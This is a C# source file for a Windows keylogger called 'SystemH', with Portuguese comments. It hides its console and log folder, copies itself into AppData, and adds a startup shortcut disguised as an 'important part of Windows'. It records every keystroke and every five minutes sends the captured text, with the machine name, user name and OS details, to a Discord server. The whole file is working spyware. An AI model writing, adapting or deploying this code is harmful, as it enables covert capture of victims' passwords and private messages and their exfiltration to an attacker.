using IWshRuntimeLibrary;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace CastApp
{
    public class Program
    {
        /// <summary>
        /// Pasta e arquivo de log
        /// </summary>
        private static readonly string LogDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "SystemH");
        private static readonly string LogFile = Path.Combine(LogDirectory, "SystemH.log");

        /// <summary>
        /// Lock para escrita no arquivo para evitar condições de corrida em ambientes multithread
        /// </summary>
        private static readonly object FileLock = new object();

        /// <summary>
        /// Buffer para armazenar teclas antes de escrever no arquivo
        /// </summary>
        private static readonly StringBuilder KeyBuffer = new StringBuilder();
        private static DateTime lastFlush = DateTime.Now;
        private static readonly TimeSpan FlushInterval = TimeSpan.FromSeconds(30);

        // ADICIONADO: Instâncias para Discord
        private static DiscordConfigService? _configService;
        private static DiscordLogger? _discordLogger;
        private static readonly StringBuilder DiscordBuffer = new StringBuilder();
        private static DateTime lastDiscordSend = DateTime.Now;
        private static readonly TimeSpan DiscordSendInterval = TimeSpan.FromMinutes(5); // Enviar a cada 5 minutos

        private static Mutex? _mutex;

        /// <summary>
        /// Ponto de entrada do programa
        /// </summary>
        private static async Task Main()
        {
            ///<summary>
            /// Natives.FreeConsole(); Esconde o console mas no visual studio continua fica visivel
            /// para que assim possamos ver os erros que possam ocorrer
            /// <summary>
            Natives.FreeConsole();

            // Garante que apenas uma instância do SystemH esteja rodando
            _mutex = new Mutex(initiallyOwned: true, "SystemH", out var createdNew);

            try
            {
                if (createdNew)
                {
                    // Cria o diretório de log se não existir e seta como oculto
                    Directory.CreateDirectory(LogDirectory);
                    DirectoryInfo dirInfo = new DirectoryInfo(LogDirectory);
                    if (!dirInfo.Attributes.HasFlag(FileAttributes.Hidden))
                    {
                        dirInfo.Attributes |= FileAttributes.Hidden;
                    }

                    await InitializeDiscordServices();
                    InstallToStartup();
                    StartKeyCapture();
                }
            }
            catch (Exception ex)
            {
                await LogError($"Erro fatal: {ex.Message}");
                Console.ReadKey();
            }
        }

        // ADICIONADO: Inicializa os serviços do Discord
        private static async Task InitializeDiscordServices()
        {
            try
            {
                _configService = new DiscordConfigService();
                var config = await _configService.GetDiscordConfigAsync();

                _discordLogger = new DiscordLogger(
                    config.Token ?? throw new Exception("Token do Discord não encontrado"),
                    (ulong)config.LogGuildId,
                    (ulong)config.MachineCategoryId
                );

                await _discordLogger.InitializeAsync();
                await LogError("Discord inicializado com sucesso!");
            }
            catch (Exception ex)
            {
                await LogError($"Erro ao inicializar Discord: {ex.Message}");
            }
        }

        private static async Task LogError(string message)
        {
            try
            {
                string logMessage = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}\r\n";
                string errorLogFile = Path.Combine(LogDirectory, "error.log");
                await System.IO.File.AppendAllTextAsync(errorLogFile, logMessage);
            }
            catch
            {
                // Ignora erros de log
            }
        }

        private static string GetMachineName() => Environment.MachineName;
        private static string GetUserName() => Environment.UserName;
        private static string GetOSVersion() => Environment.OSVersion.ToString();
        private static string GetCpuCount() => Environment.ProcessorCount.ToString();

        public static void InstallToStartup()
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                throw new PlatformNotSupportedException("Este método só é suportado no Windows.");

            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string text = Path.Combine(folderPath, "SystemH");
            Directory.CreateDirectory(text);
            string path = Environment.ProcessPath ?? Assembly.GetExecutingAssembly().Location;
            string fileName = Path.GetFileName(path);

            // Lista atualizada de arquivos necessários
            string[] array = new string[] {
                fileName,
                "DSharpPlus.dll",
                "CastApp.dll",
                "CastApp.deps.json",
                "CastApp.runtimeconfig.json",
                "Microsoft.Extensions.Logging.Abstractions.dll",
                "Newtonsoft.Json.dll",
                "SystemH.enc" // ADICIONADO: Inclui o arquivo de credenciais
            };

            string? directoryName = Path.GetDirectoryName(path);
            if (directoryName == null)
                throw new InvalidOperationException("O diretório do executável não pôde ser determinado.");

            foreach (string file in array)
            {
                string sourcePath = Path.Combine(directoryName, file);
                string destPath = Path.Combine(text, file);
                if (System.IO.File.Exists(sourcePath) && !System.IO.File.Exists(destPath))
                {
                    System.IO.File.Copy(sourcePath, destPath, overwrite: false);
                }
            }

            string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string pathLink = Path.Combine(folderPath2, "SystemH.lnk");

            Type? wshType = Marshal.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
            if (wshType == null)
                throw new InvalidOperationException("Não foi possível obter o tipo WshShell.");

            WshShell wshShell = (WshShell)Activator.CreateInstance(wshType)!;
            IWshShortcut wshShortcut = (IWshShortcut)(dynamic)wshShell.CreateShortcut(pathLink);
            wshShortcut.TargetPath = Path.Combine(text, fileName);
            wshShortcut.WorkingDirectory = text;
            wshShortcut.WindowStyle = 1;
            wshShortcut.Description = "Inicia o SystemH na inicialização, Parte IMPORTANTE do Windows";
            wshShortcut.Save();
        }

        /// <summary>
        /// Loop principal de captura de teclas
        /// </summary>
        private static void StartKeyCapture()
        {
            while (true)
            {
                try
                {
                    // Flush do buffer local
                    if (DateTime.Now - lastFlush > FlushInterval)
                    {
                        FlushBuffer();
                    }

                    if (DateTime.Now - lastDiscordSend > DiscordSendInterval)
                    {
                        _ = Task.Run(SendDiscordLogAsync);
                    }

                    bool leftShift = (Natives.GetAsyncKeyState(160) & 0x8000) != 0;
                    bool rightShift = (Natives.GetAsyncKeyState(161) & 0x8000) != 0;
                    bool shift = leftShift || rightShift;
                    bool capsLock = Console.CapsLock;

                    for (int vkCode = 0; vkCode < 256; vkCode++)
                    {
                        short keyState = (short)Natives.GetAsyncKeyState(vkCode);

                        if (keyState == 1 || keyState == -32767)
                        {
                            ProcessKey(vkCode, shift, capsLock);
                        }
                    }

                    Thread.Sleep(1);
                }
                catch (Exception ex)
                {
                    _ = Task.Run(() => LogError($"Erro no loop principal: {ex.Message}"));
                    Thread.Sleep(100);
                }
            }
        }

        private static async Task SendDiscordLogAsync()
        {
            try
            {
                if (_discordLogger == null || DiscordBuffer.Length == 0)
                    return;

                string content;
                lock (DiscordBuffer)
                {
                    content = DiscordBuffer.ToString();
                    DiscordBuffer.Clear();
                }

                if (string.IsNullOrWhiteSpace(content))
                    return;

                if (content.Length > 1900)
                {
                    content = content.Substring(content.Length - 1900);
                    content = "...[truncado]..." + content;
                }

                await _discordLogger.SendLogAsync(
                    GetMachineName(),
                    GetUserName(),
                    GetOSVersion(),
                    GetCpuCount(),
                    content
                );

                lastDiscordSend = DateTime.Now;
            }
            catch (Exception ex)
            {
                await LogError($"Erro ao enviar para Discord: {ex.Message}");
            }
        }

        /// <summary>
        /// Processa uma tecla pressionada
        /// </summary>
        private static void ProcessKey(int vkCode, bool shift, bool capsLock)
        {
            try
            {
                var keyInfo = GetKeyInfo(vkCode, shift, capsLock);

                if (!string.IsNullOrEmpty(keyInfo))
                {
                    lock (KeyBuffer)
                    {
                        KeyBuffer.Append(keyInfo);
                    }

                    lock (DiscordBuffer)
                    {
                        DiscordBuffer.Append(keyInfo);
                    }
                }
            }
            catch (Exception ex)
            {
                _ = Task.Run(() => LogError($"Erro ao processar tecla {vkCode}: {ex.Message}"));
            }
        }

        /// <summary>
        /// Converte código de tecla virtual para caractere/string
        /// </summary>
        private static string GetKeyInfo(int vkCode, bool shift, bool capsLock)
        {
            return vkCode switch
            {
                // Teclas especiais
                8 => "[BACKSPACE]", // Backspace
                9 => "\t",           // Tab
                13 => "\r\n",        // Enter
                27 => "[ESC]",       // Escape
                32 => " ",           // Espaço

                // Teclas de função
                >= 112 and <= 123 => $"[F{vkCode - 111}]", // F1-F12

                // Setas
                37 => "[←]", // Esquerda
                38 => "[↑]", // Cima
                39 => "[→]", // Direita
                40 => "[↓]", // Baixo

                // Letras A-Z
                >= 65 and <= 90 => ProcessLetter((char)vkCode, shift, capsLock),

                // Números e símbolos
                >= 48 and <= 57 => ProcessNumber(vkCode, shift),

                // Numpad
                >= 96 and <= 105 => ((char)(vkCode - 48)).ToString(), // Numpad 0-9

                // Pontuação comum
                186 => shift ? ":" : ";",    // ;:
                187 => shift ? "+" : "=",    // =+
                188 => shift ? "<" : ",",    // ,<
                189 => shift ? "_" : "-",    // -_
                190 => shift ? ">" : ".",    // .>
                191 => shift ? "?" : "/",    // /?
                192 => shift ? "~" : "`",    // `~
                219 => shift ? "{" : "[",    // [{
                220 => shift ? "|" : "\\",   // \|
                221 => shift ? "}" : "]",    // ]}
                222 => shift ? "\"" : "'",   // '"

                // Outras teclas especiais
                16 => "[SHIFT]",
                17 => "[CTRL]",
                18 => "[ALT]",
                20 => "[CAPS]",
                144 => "[NUMLOCK]",
                145 => "[SCROLL]",

                _ => null! // Tecla não mapeada
            };
        }

        /// <summary>
        /// Processa letras considerando Shift e CapsLock
        /// </summary>
        private static string ProcessLetter(char letter, bool shift, bool capsLock)
        {
            bool shouldBeUpper = shift ^ capsLock;
            return shouldBeUpper ? letter.ToString() : char.ToLower(letter).ToString();
        }

        /// <summary>
        /// Processa números e seus símbolos correspondentes
        /// </summary>
        private static string ProcessNumber(int vkCode, bool shift)
        {
            return vkCode switch
            {
                48 => shift ? ")" : "0",
                49 => shift ? "!" : "1",
                50 => shift ? "@" : "2",
                51 => shift ? "#" : "3",
                52 => shift ? "$" : "4",
                53 => shift ? "%" : "5",
                54 => shift ? "^" : "6",
                55 => shift ? "&" : "7",
                56 => shift ? "*" : "8",
                57 => shift ? "(" : "9",
                _ => null!
            };
        }

        /// <summary>
        /// Escreve o buffer no arquivo de log
        /// </summary>
        private static void FlushBuffer()
        {
            try
            {
                string content;
                lock (KeyBuffer)
                {
                    if (KeyBuffer.Length == 0) return;

                    content = KeyBuffer.ToString();
                    KeyBuffer.Clear();
                }

                lock (FileLock)
                {
                    System.IO.File.AppendAllText(LogFile, content, Encoding.UTF8);
                }

                lastFlush = DateTime.Now;
            }
            catch (Exception ex)
            {
                _ = Task.Run(() => LogError($"Erro ao escrever no arquivo: {ex.Message}"));
            }
        }
    }
}